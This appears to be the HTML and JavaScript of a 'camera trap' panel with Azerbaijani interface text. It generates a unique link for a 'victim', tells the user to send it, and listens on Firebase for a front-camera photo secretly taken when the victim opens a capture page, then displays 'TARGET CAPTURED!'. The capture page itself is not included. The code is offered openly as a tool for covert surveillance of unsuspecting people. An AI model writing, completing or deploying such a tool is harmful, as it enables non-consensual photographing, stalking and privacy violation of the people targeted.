<div id="trap-module" style="color: white; font-family: 'Outfit', sans-serif; text-align: center; padding: 20px; background: #050505; border-radius: 15px; border: 1px solid #222;">
    <i class="fas fa-eye" style="font-size: 3.5rem; color: #ff007a; margin-bottom: 20px; text-shadow: 0 0 15px #ff007a;"></i>
    <h2 id="trap-head" style="font-family: 'Syncopate'; font-size: 0.9rem; letter-spacing: 2px;">CAMERA TRAP LIVE</h2>
    
    <div id="trap-init-gate">
        <p style="opacity: 0.6; font-size: 0.75rem; line-height: 1.5;">Qurban üçün gizli kamera tələsi yaradın.<br>Linkə daxil olan kimi ön kamera şəkli panelinizə düşəcək.</p>
        <button onclick="generateSecureLink()" id="gen-btn" 
            style="width: 100%; padding: 18px; border-radius: 15px; border: none; background: #ff007a; color: white; font-weight: 900; cursor: pointer; margin-top: 15px; text-transform: uppercase; box-shadow: 0 5px 15px rgba(255, 0, 122, 0.3);">
            TƏLƏ LİNKİNİ YARAT
        </button>
    </div>

    <div id="trap-result" style="display: none; margin-top: 20px; animation: fadeInUp 0.5s;">
        <div style="background: #000; padding: 15px; border-radius: 12px; border: 1px solid #ff007a; margin-bottom: 20px;">
            <code id="final-link-box" style="color: #ff007a; font-size: 0.75rem; word-break: break-all; display: block; padding: 10px;"></code>
            <button onclick="copyTrapLink()" style="background: none; border: 1px solid #444; color: #888; font-size: 0.6rem; padding: 5px 10px; border-radius: 5px; margin-top: 10px; cursor: pointer;">LİNKİ KOPYALA</button>
        </div>

        <div style="border-top: 1px solid #222; padding-top: 20px;">
            <h4 style="font-size: 0.7rem; color: #00ff00; letter-spacing: 2px; text-transform: uppercase;">
                <i class="fas fa-sync-alt fa-spin"></i> CANLI PANEL GÖZLƏNİLİR
            </h4>
            <div id="capture-display" style="margin-top: 15px; min-height: 200px; background: rgba(255,255,255,0.02); border-radius: 15px; display: flex; align-items: center; justify-content: center; border: 1px dashed #333; overflow: hidden;">
                <span id="wait-text" style="opacity: 0.4; font-size: 0.7rem; text-align: center;">
                    <i class="fas fa-user-secret" style="display:block; font-size: 2rem; margin-bottom: 10px;"></i>
                    Qurbanın daxil olması gözlənilir...
                </span>
            </div>
        </div>
    </div>
</div>

<style>
    @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
</style>

<script>
    async function generateSecureLink() {
        // Xal yoxlaması tamamilə ləğv edildi. 
        // Key sistemi ilə girən hər kəs birbaşa yarada bilər.
        
        document.getElementById('trap-init-gate').style.display = 'none';
        document.getElementById('trap-result').style.display = 'block';
        
        // Median (GoNative) və ya normal hosting URL-i
        const siteUrl = window.location.origin;
        const user = localStorage.getItem('elite_session') || "anonymous";
        const uniqueID = "TR" + Math.floor(Math.random() * 99999);
        
        // Qurbanın daxil olacağı link (capture.html səhifəsi mütləq olmalıdır)
        const fullLink = `${siteUrl}/capture.html?id=${uniqueID}&ref=${user}`;
        document.getElementById('final-link-box').innerText = fullLink;

        // Firebase-də canlı izləməni başladırıq
        startLiveListener(user, uniqueID);
    }

    function copyTrapLink() {
        const link = document.getElementById('final-link-box').innerText;
        navigator.clipboard.writeText(link);
        alert("Link kopyalandı! İndi qurbana göndərin.");
    }

    function startLiveListener(user, trapID) {
        // Firebase-də həmin trapID-ni izləyirik
        // Hədəf capture.html-ə girəndə şəkli bura göndərəcək
        db.ref('traps/' + user + '/' + trapID).on('value', (snapshot) => {
            const data = snapshot.val();
            if (data && data.image) {
                const display = document.getElementById('capture-display');
                display.innerHTML = `
                    <div style="animation: fadeIn 1s; width: 100%; text-align: center; padding: 10px;">
                        <img src="${data.image}" style="width: 100%; border-radius: 12px; border: 2px solid #00ff00; box-shadow: 0 0 15px rgba(0,255,0,0.2);">
                        <div style="background: rgba(0,255,0,0.1); color: #00ff00; padding: 10px; border-radius: 8px; margin-top: 10px; font-size: 0.7rem;">
                            <b><i class="fas fa-check-circle"></i> TARGET CAPTURED!</b><br>
                            Zaman: ${data.time || new Date().toLocaleTimeString()}
                        </div>
                    </div>
                `;
                // Bildiriş səsi və ya vibrasiya
                if (navigator.vibrate) navigator.vibrate(200);
                console.log("Məlumat gəldi!");
            }
        });
    }
</script>
